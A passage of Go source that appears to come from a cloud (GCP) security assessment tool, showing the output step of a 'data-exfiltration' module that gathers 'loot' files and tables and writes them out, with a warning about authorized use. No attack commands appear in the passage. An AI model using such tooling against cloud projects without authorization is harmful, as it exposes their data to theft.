	// Collect loot files
	var lootFiles []internal.LootFile
	for _, loot := range m.LootMap {
		if loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization!\n\n") {
			lootFiles = append(lootFiles, *loot)
		}
	}

	// Build tables
	tables := []internal.TableFile{}

	if len(body) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration",
			Header: header,
			Body:   body,
		})
	}

	output := DataExfiltrationOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
